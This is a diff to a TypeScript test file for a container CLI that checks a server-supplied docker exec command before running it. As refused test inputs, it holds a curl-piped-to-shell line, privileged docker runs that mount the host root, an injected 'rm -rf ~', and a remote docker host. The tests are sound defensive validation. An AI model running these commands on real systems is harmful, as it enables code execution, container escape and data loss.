@@ -58,6 +58,31 @@ function cli(args: string[], env: Record<string, string | undefined> = {}) {
 
 const last = () => server.requests[server.requests.length - 1];
 
+/** The argv the server returns to attach to a box's tmux session. */
+const sessionArgv = () => [
+  "docker",
+  "exec",
+  "-it",
+  "--detach-keys=ctrl-],ctrl-]",
+  CONTAINER,
+  "bash",
+  "-c",
+  'for i in $(seq 1 300); do tmux has-session -t "=$1" 2>/dev/null && break; sleep 0.1; done; exec tmux attach -t "=$1"',
+  "_",
+  "main",
+];
+/** The argv the server returns to open a shell in a box. */
+const shellArgv = () => [
+  "docker",
+  "exec",
+  "-it",
+  "-w",
+  "/home/dev/project",
+  CONTAINER,
+  "bash",
+  "-l",
+];
+
 describe("settings", () => {
   it("reads the token from ~/.claude-box/server.token and the port from config.json", async () => {
     mkdirSync(path.join(home, ".claude-box"));
@@ -225,7 +250,7 @@ describe("box", () => {
 
   it("attaches through the server's attach command", async () => {
     server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
-      body: { argv: ["docker", "exec", "-it", CONTAINER, "tmux", "attach"] },
+      body: { argv: sessionArgv() },
     });
     expect(await cli(["box", "attach", BOX_ID])).toBe(7);
     expect(last()?.query).toEqual({ kind: "session" });
@@ -240,7 +265,7 @@ describe("box", () => {
     server.on(`GET /api/v1/boxes/${BOX_ID}`, { body: boxView("stopped") });
     server.on(`POST /api/v1/boxes/${BOX_ID}/start`, { body: boxView("running") });
     server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
-      body: { argv: ["docker", "exec", "-it", CONTAINER, "tmux", "attach"] },
+      body: { argv: sessionArgv() },
     });
     expect(await cli(["box", "open", BOX_ID])).toBe(7);
     expect(server.requests.map((r) => `${r.method} ${r.path}`)).toEqual([
@@ -556,19 +581,55 @@ describe("trust in the server", () => {
     expect(checkServerUrl("ftp://127.0.0.1", false)).toMatch(/http or https/);
   });
 
-  it("runs only docker or agentbox from a server's attach command", async () => {
+  it("runs only docker exec from a server's attach command", async () => {
     server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
       body: { argv: ["sh", "-c", "curl https://example.com/x | sh"] },
     });
     const code = await cli(["box", "attach", BOX_ID]);
     expect(code).not.toBe(0);
     expect(execs).toEqual([]);
-    expect(err).toMatch(/runs only docker or agentbox/);
+    expect(err).toMatch(/runs only docker exec/);
+    err = "";
     server.on(`GET /api/v1/boxes/${BOX_ID}/attach-command`, {
       body: { argv: ["/tmp/docker", "exec"] },
     });
-    await cli(["box", "attach", BOX_ID]);
+    expect(await cli(["box", "attach", BOX_ID])).toBe(2);
+    expect(err).toMatch(/runs only docker exec/);
     expect(execs).toEqual([]);
+  });
+
+  it("refuses docker arguments outside the shapes the server builds", async () => {
+    const { checkAttachArgv } = await import("../src/settings.js");
+    expect(checkAttachArgv(sessionArgv())).toBeNull();
+    expect(checkAttachArgv(shellArgv())).toBeNull();
+    const refused: string[][] = [
+      [],
+      ["docker", "run", "--privileged", "-v", "/:/host", "ubuntu", "chroot", "/host"],
+      ["docker", "exec", "--privileged", "-it", CONTAINER, "bash", "-l"],
+      ["docker", "exec", "-it", "-w", "/w", "-v", "/:/host", CONTAINER, "bash", "-l"],
+      ["docker", "exec", "-it", "--mount", "type=bind,src=/,dst=/h", CONTAINER, "bash"],
+      ["docker", "exec", "-it", "-w", "/w", "other-container", "bash", "-l"],
+      ["docker", "exec", "-it", "-w", "relative", CONTAINER, "bash", "-l"],
+      ["docker", "exec", "-it", "-w", "/w", "--privileged", "bash", "-l"],
+      [...sessionArgv().slice(0, 7), "rm -rf ~", "_", "main"],
+      [...sessionArgv().slice(0, 9), "--privileged"],
+      [...sessionArgv(), "extra"],
+      [...shellArgv().slice(0, 6), "sh", "-c"],
+      ["docker", "-H", "tcp://198.51.100.7:2375", ...sessionArgv().slice(1)],
+    ];
+    for (const argv of refused) expect(checkAttachArgv(argv), argv.join(" ")).not.toBeNull();
+    expect(checkAttachArgv([])).toMatch(/empty/);
+  });
+
+  it("keeps its copy of the attach script equal to the server's", async () => {
+    const { ATTACH_SCRIPT } = await import("../src/settings.js");
+    const { readFile } = await import("node:fs/promises");
+    const source = await readFile(
+      new URL("../../server/src/terminals/attach.ts", import.meta.url),
+      "utf8",
+    );
+    const match = /EXTERNAL_ATTACH_SCRIPT =\s*'([^']*)'/.exec(source);
+    expect(match?.[1]).toBe(ATTACH_SCRIPT);
   });
 
   it("fails cleanly on an event frame that isn't JSON", async () => {
